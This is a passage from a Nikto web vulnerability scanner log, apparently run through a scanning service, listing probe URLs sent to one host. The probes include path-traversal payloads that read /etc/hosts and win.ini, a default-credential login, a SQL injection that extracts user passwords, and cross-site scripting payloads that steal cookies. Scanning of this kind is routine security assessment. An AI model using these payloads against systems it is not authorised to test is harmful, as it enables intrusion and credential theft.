[NIKTO-SRV] [NIKTO] + /3rdparty/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../ sent cookie: JSESSIONID=912C0216E0CFF84C99F3EAA3AF83D9A7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../ sent cookie: JSESSIONID=8BD0203936375FD43C98ECFD417B7BB5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /3rdparty/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../ sent cookie: JSESSIONID=181ABF5CD151D93460FAD1168CD24250; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../ sent cookie: JSESSIONID=242D1AF721B0C5B5FAE745CE46BCEFC0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../ sent cookie: JSESSIONID=BE1910DE2F1077EC9CA535B05487A27F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /.tools/phpMyAdmin/current/db_details_importdocsql.php?submit_show=true&do=import&docpath=../ sent cookie: JSESSIONID=51BB444B9E577E19A70287B5EAEBC181; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /asp/sqlqhit.asp sent cookie: JSESSIONID=A76BB1CF3036C179AA555367B948485F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /asp/SQLQHit.asp sent cookie: JSESSIONID=B562244BAD6108F9E59D3F953E967B91; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /iissamples/issamples/sqlqhit.asp sent cookie: JSESSIONID=B5168AF0606AFAAE7512465DEE1F3973; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /iissamples/issamples/SQLQHit.asp sent cookie: JSESSIONID=537623327CB896E39965A2DB32F48122; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ISSamples/sqlqhit.asp sent cookie: JSESSIONID=D99E544006CDA757AB49707D7665A956; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ISSamples/SQLQHit.asp sent cookie: JSESSIONID=9EF6D5655EC5896D529D2D9D174DB9C9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ChqsU.aspx sent cookie: JSESSIONID=EF3C95AF4AA375DF8C9B32B625470DE6; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /oc/Search/sqlqhit.asp sent cookie: JSESSIONID=44D9C40CA8A10AF03CDB6243932F780E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /oc/Search/SQLQHit.asp sent cookie: JSESSIONID=A988D9CE43CF3BE25DB0D8EFAE0342F3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /search/htx/sqlqhit.asp sent cookie: JSESSIONID=6FC69F64A38BFB659109C73CB9E15730; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /search/htx/SQLQHit.asp sent cookie: JSESSIONID=14B5AA3BD35BB4EC61E27DB29BBA0CE9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /search/sqlqhit.asp sent cookie: JSESSIONID=CFF493BB67B54DF16DB524D75C47ED92; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /search/SQLQHit.asp sent cookie: JSESSIONID=828D5B9D09B18F63DD4C63F3DB7F9BA5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /sqlqhit.asp sent cookie: JSESSIONID=A43E400B9DFF9CCE9DD32CF9EE63CE85; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /SQLQHit.asp sent cookie: JSESSIONID=00690BA27F7AAB08C978110445E599F3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /?OpenServer sent cookie: JSESSIONID=315C0952B73C4F97D586151D8C95B52D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-bin/testing_whatever sent cookie: JSESSIONID=CF8EA4FC6C3B454CD33F86136A16D3F7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /LOGIN.PWD sent cookie: JSESSIONID=CA44BB4CFD6AF9CD2CF12D594AA114B3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /USER/CONFIG.AP sent cookie: JSESSIONID=3DCCDCE636B7A3BBE9F4B58E473EADAA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /.perf sent cookie: JSESSIONID=301B23BFE45D0FC6CFA5AB27F2782AE0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=8263236DFBF3BD8A70D7325C6711BBFA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=D18BFA36A8971F5068147C8841EDCE54; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + // sent cookie: JSESSIONID=EBA99EE1532F36A95D5C7BEC122A90B7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /admin-serv/config/admpw sent cookie: JSESSIONID=B213BD51B8B8EA3139F610B4AF589B5F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /test.php%20 sent cookie: JSESSIONID=15DEA8864543617D7DCE20DFD3773E68; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /*.* sent cookie: JSESSIONID=5E5312C112E38C0012B86D4F925B9E77; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-bin/cgi_process sent cookie: JSESSIONID=EB9D1BABA6B0D8C86F7771A254ABC234; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ht_root/wwwroot/-/local/httpd$map.conf sent cookie: JSESSIONID=60C396475FFD90F07A27D6EC48250805; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /7teADOLnZ2 sent cookie: JSESSIONID=8E44A58458B4621544D0A5BB44C99EC0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /local/httpd$map.conf sent cookie: JSESSIONID=8286E8826DE39F67661AE60EFD6BE61B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /tree sent cookie: JSESSIONID=9A0FD2DDF5C0EA2480334D6CAF65DD54; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /%2e/ sent cookie: JSESSIONID=B812FBFCAB874AE8E15B2A24FD2A6DCC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /weblogic sent cookie: JSESSIONID=92F79BF607202B2C3E68E4DDDCC907A6; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.html%20 sent cookie: JSESSIONID=D319FB1C0C234E384C0CA567478E0B5F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /gzWq4q5pgf sent cookie: JSESSIONID=FA0DC97A6BA72D4A28AED3A339C68533; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /somethingnotthere.ida sent cookie: JSESSIONID=BFABC1F50ADB82DB819C7A39CBC91B5D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /examples/servlet/TroubleShooter sent cookie: JSESSIONID=0E5504D12F34D99DB32B23245B562D38; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /goform/CheckLogin?login=root&password=tslinux sent cookie: JSESSIONID=3A3114DEA304D78D590E2C7E5C646B09; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /.nsf/../Windows/win.ini sent cookie: JSESSIONID=A6710211FC8FB08C33E5F3F37B2F126E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /prxdocs/misc/prxrch.idq?CiTemplate=../../../../../../../../../../Windows/win.ini sent cookie: JSESSIONID=8138AA55DFAEC34FE2764BF2A829EE1D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /query.idq?CiTemplate=../../../../../../../../../../Windows/win.ini sent cookie: JSESSIONID=8DED866CA3C4297298F1F6CB76338F17; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /iissamples/issamples/fastq.idq?CiTemplate=../../../../../../../../../../Windows/win.ini sent cookie: JSESSIONID=2A439EE7D09B4CE8A4D6B8CB16127D2F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /iissamples/issamples/query.idq?CiTemplate=../../../../../../../../../../Windows/win.ini sent cookie: JSESSIONID=1921BE85D0742D1E84F7EE9AA2F83566; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20 sent cookie: JSESSIONID=75D9AD7D14E8A632625045F125B2D252; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20 sent cookie: JSESSIONID=6E853AF0F20F02DC6E18AB084BF81C56; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /................../config.sys sent cookie: JSESSIONID=6453E37287AB0C143F8C78927AA77022; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cfdocs/exampleapp/email/getfile.cfm?fileNikto=/etc/hosts sent cookie: JSESSIONID=1637A791ABCA07449CB2209AA23A2564; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cfdocs/exampleapp/docs/sourcewindow.cfm?Template=/etc/hosts sent cookie: JSESSIONID=160C98792BC26D4740A4B4CBE0B49F6F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cfdocs/expeval/exprcalc.cfm?OpenFilePath=/etc/hosts sent cookie: JSESSIONID=E87B4D5D2A053DF518A4CCFC6F8934D7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /netget?sid=user&msg=300&file=../../../../../../../..//etc/hosts sent cookie: JSESSIONID=82609A855AD4DFB7090D96A22E9978AE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /wx/s.dll?d=/Windows/win.ini sent cookie: JSESSIONID=873D240DE90F4F7ED7BE2D519A86A7BD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../Windows/win.ini%00 sent cookie: JSESSIONID=7B003497E5C1CD584AE47A51A4C4F16C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + ///etc/hosts sent cookie: JSESSIONID=0363808DBFA87BFE86091D511403D65E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /.cobalt/sysManage/../admin/.htaccess sent cookie: JSESSIONID=36D106AB0DCFF4C4BBA97BB45440A594; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /albums/userpics/Copperminer.jpg.php?cat%20/etc/hosts sent cookie: JSESSIONID=69552A747B4DC508751DEE3920BAA946; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /autohtml.php?op=modload&mainfile=x&Nikto=/etc/hosts sent cookie: JSESSIONID=E1D176E7889CBF08FF7DB5C4EADF3CD3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /atomicboard/index.php?location=../../../../../../../..//etc/hosts sent cookie: JSESSIONID=5B774B6CA9E2EFBEABC0F4D796E3BF06; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /current/modules.php?mod=fm&file=../../../../../../../..//etc/hosts%00&bn=fm_d1 sent cookie: JSESSIONID=407930F68EC73DBA3D28C001E8EC4B27; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /current/index.php?site=demos&bn=../../../../../../../..//etc/hosts%00 sent cookie: JSESSIONID=18EB54BE3016A52EB4BCA4420FB7ADAC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts%00 sent cookie: JSESSIONID=26535F6930FA396E3791BBEA7B0A960B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cms/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts%00 sent cookie: JSESSIONID=5D093A50A909741AF42DA92023E011C7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts%00 sent cookie: JSESSIONID=DF3F163F53DFC347F8EBE7F4B70E6D95; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /typo/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts%00 sent cookie: JSESSIONID=834F71088BCCCED182F2E37B86CF1EC1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /typo3/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts%00 sent cookie: JSESSIONID=2A9FDC820A0A722C98B0660D86E3D09B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.php?download=/etc/hosts sent cookie: JSESSIONID=BAC4C571796680114A33F55D7AD6085F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.php?page=../../../../../../../..//etc/hosts sent cookie: JSESSIONID=75FE67C5CC3941CE1E434971EF2444AD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.php?l=forum/view.php&topic=../../../../../../../..//etc/hosts sent cookie: JSESSIONID=D51ACD243EFD827CE97AAF0E401F1A60; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../..//etc/hosts sent cookie: JSESSIONID=965538C146E6988AC204113018FBA3A8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /k/home?dir=/&file=../../../../../../../..//etc/hosts&lang=kor sent cookie: JSESSIONID=2D9570E5879E18F85113108CBAF084DD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /nph-showlogs.pl?files=../../../../../../../..//etc/hosts&filter=.*&submit=Go&linecnt=500&refresh=0 sent cookie: JSESSIONID=0C2A2C23A63F88888095355604DF98D4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /nph-showlogs.pl?files=../../../../../../../../etc/&filter=.*&submit=Go&linecnt=500&refresh=0 sent cookie: JSESSIONID=9CFDFEDA470A93F5E1EB0ECEF8DEC225; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /phprocketaddin/?page=../../../../../../../../../../Windows/win.ini sent cookie: JSESSIONID=5B1D88A3E9D5CD256CA311FBC5F8A2A1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /phpwebfilemgr/index.php?f=../../../../../../../..//etc/hosts sent cookie: JSESSIONID=1580047F823ACDCE6181F570564962D2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /phpwebfilemgr/index.php?f=../../../../../../../../../etc sent cookie: JSESSIONID=32DD1BA7F6415D642CF87145706CBEDD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /phptonuke.php?filnavn=/etc/hosts sent cookie: JSESSIONID=6EEAF043B324B235CB7777E54E08B9E9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /put/cgi-bin/putport.exe?SWAP&BOM&OP=none&Lang=en-US&PutHtml=../../../../../../../..//etc/hosts sent cookie: JSESSIONID=6BA84FFEA456CDEAB19A585A37BB30CF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ROADS/cgi-bin/search.pl?form=../../../../../../../..//etc/hosts%00 sent cookie: JSESSIONID=9B1832B7CC8C6F749D2DEB8A3C88C2C0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /support/common.php?f=0&ForumLang=../../../../../../../..//etc/hosts sent cookie: JSESSIONID=CBB0DE6705CEF4ABDD812868975960BF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /viewpage.php?file=/etc/hosts sent cookie: JSESSIONID=ED0B5C01311562E373B20EB425B1F7FA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /Web_Store/web_store.cgi?page=../../../../../../../..//etc/hosts%00.html sent cookie: JSESSIONID=59536F7899DE26F6E6A417912330CC5D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/hosts&MSPStoreType=image/gif sent cookie: JSESSIONID=6DCFC288429E67ED783B59F99FFA815A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /servlet/webacc?User.html=../../../../../../../..//etc/hosts%00 sent cookie: JSESSIONID=04E0708684731BDA0F7686B848FE321B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webcalendar/forum.php?user_inc=../../../../../../../..//etc/hosts sent cookie: JSESSIONID=4C6D30AB6D03AFE97C7920545AB035DC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /page.cgi?../../../../../../../..//etc/hosts sent cookie: JSESSIONID=C09F5EAEC2B82F218940AE365B6FEC45; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2F/etc/hosts sent cookie: JSESSIONID=0DE301BB5BED37B195A394D873CD3A76; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /base/webmail/readmsg.php?mailbox=../../../../../../../..//etc/hosts&id=1 sent cookie: JSESSIONID=EEB24078076F1F20EB9BD40AE1309202; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /PSUser/PSCOErrPage.htm?errPagePath=../../../../../../../..//etc/hosts sent cookie: JSESSIONID=8D1A69837E93D1E0A0D1CB44A15EAED9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /search?NS-query-pat=../../../../../../../..//etc/hosts sent cookie: JSESSIONID=4CAF33077C02BE6CAF5A0A3E3E1DC325; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /................../etc/hosts sent cookie: JSESSIONID=642E93D46342C856E57EAD2DAF1FC439; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /%3f.jsp sent cookie: JSESSIONID=B07568C5144F5C50B65C735875FD7A30; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /admentor/adminadmin.asp sent cookie: JSESSIONID=364EB7B9A8807CD41DD9519A20A82C7A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /My_eGallery/public/displayCategory.php sent cookie: JSESSIONID=B5B6B3F6FF4755BF5AFE2277DA61DF1E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /postnuke/My_eGallery/public/displayCategory.php sent cookie: JSESSIONID=4C416AE6A17351ABC4DF723A4A86D3A0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /postnuke/html/My_eGallery/public/displayCategory.php sent cookie: JSESSIONID=AF78ACE4FF23C3BAF002E318F861768D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /modules/My_eGallery/public/displayCategory.php sent cookie: JSESSIONID=EF687818E53E4C2397B6F9FEC7ACC5CF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /phpBB/My_eGallery/public/displayCategory.php sent cookie: JSESSIONID=7D68FBDC2726F7DCD51782C681E3EB4E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /forum/My_eGallery/public/displayCategory.php sent cookie: JSESSIONID=64A414BCC97654DABB2D9CBBC22F3E2C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /imp/mailbox.php3?actionID=6&server=x&imapuser=x';somesql+--&pass=x sent cookie: JSESSIONID=FF6AC8358CBA963770A208C1223CA120; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /userinfo.php?uid=1; sent cookie: JSESSIONID=C919F3AA01B5D44C86916051FF2FA725; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* sent cookie: JSESSIONID=BAE3E90E0D540FEACB9D4FF46BC65B8F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* sent cookie: JSESSIONID=988BEF83A7077A3189AFB6882EC1C659; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* sent cookie: JSESSIONID=0EB48B186E3DB728FFAA58E378DFAB06; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /author.asp sent cookie: JSESSIONID=3A952C8F3067B8D2B8E38D8EA85D0BC1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /horde/test.php sent cookie: JSESSIONID=5E94BBB984E0F1344346DE3B092F9E5B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /imp/horde/test.php sent cookie: JSESSIONID=489FD6DA50263C4126102D8052C47938; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /examples/cookie sent cookie: JSESSIONID=40DBD0016C291AAC5B3BB0AFA3E8B379; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /examples/session sent cookie: JSESSIONID=7AFC93DE4688366E8553B5E9818F308F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef sent cookie: JSESSIONID=09ABD525A4533DD1674EE0D6268077C6; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt; sent cookie: JSESSIONID=211B3E296C6597ABA4D3E35DAF0A5842; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] - STATUS: Completed 1000 requests (~23% complete, ~1.1 hours left): currently in plugin 'Nikto Tests'
[NIKTO-SRV] [NIKTO] - STATUS: Running average: Not enough data.
[NIKTO-SRV] [NIKTO] + /test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x sent cookie: JSESSIONID=A8A753B736FF676004C4BBB60511146A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x sent cookie: JSESSIONID=61FD65221B94153755B9E1DE7AAD7716; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt; sent cookie: JSESSIONID=C08CB4792FF4FBDC4820945F65A5F552; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webamil/test.php sent cookie: JSESSIONID=8FC7C70F72F66C27E31638C5EA5C345F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt; sent cookie: JSESSIONID=0E1AC83A89272F389B0491A58346F361; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27) sent cookie: JSESSIONID=2BF4007CE11498DDE6FC338D167E5D1F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /user.php?op=confirmnewuser&module=NS-NewUser&uNikto=%22%3E%3Cimg%20src=%22javascript:alert(document.cookie);%22%3E&email=test@test.com sent cookie: JSESSIONID=42AF060F984E67D6D44B4505CC4678AF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /user.php?op=confirmnewuser&module=NS-NewUser&uNikto=%22%3E%3Cimg%20src=%22javascript:alert(document.cookie);%22%3E&email=test@test.com sent cookie: JSESSIONID=E558B5D19952B8589285B77EDDCC2D64; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt; sent cookie: JSESSIONID=C97DBDB25C22F14DDD28F0788BEF3986; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /showcat.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt; sent cookie: JSESSIONID=3F2191E15E53832C69FBFBAC55C9D568; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt; sent cookie: JSESSIONID=C9679C0831441A1A42F9806E4C4C6A19; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello sent cookie: JSESSIONID=2F66E1FB16178FD233D430786ACFA206; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit sent cookie: JSESSIONID=32C1D09F3BE2B191368FDC140E5BED9C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E sent cookie: JSESSIONID=5A7420303FC9F3F77BA240D2F266316C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /phpimageview.php?pic=javascript:alert(8754) sent cookie: JSESSIONID=35AF3FA942A55DADEE96196E1E7C9D6C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /pforum/edituser.php?boardid=&agree=1&userNikto=%3Cscript%3Ealert('Vulnerable')%3C/script%3E&nickNikto=test&email=test@example.com&pwd=test&pwd2=test&filled=1 sent cookie: JSESSIONID=45B97CFEC757316036AC41AA568CB4BD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E sent cookie: JSESSIONID=402F737DEC93553EF073869513509704; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + ERROR: Host maximum execution time of 1200 seconds reached
[NIKTO-SRV] [NIKTO] + Scan terminated: 0 errors and 6 items reported on the remote host
[NIKTO-SRV] [NIKTO] + End Time:           2026-04-25 23:11:48 (GMT3) (1204 seconds)
[NIKTO-SRV] [NIKTO] ---------------------------------------------------------------------------
[NIKTO-SRV] [NIKTO] + 1 host(s) tested
[NIKTO-SRV] 
[NIKTO-SRV] [NIKTO] Finished in 1207s with exit code 0
[NIKTO-SRV] [NIKTO] Total output lines: 912
[NIKTO-SRV] ======================================================================
[NIKTO-SRV] 
[NIKTO-SRV] INFO:     127.0.0.1:55694 - "POST /scan HTTP/1.1" 200 OK
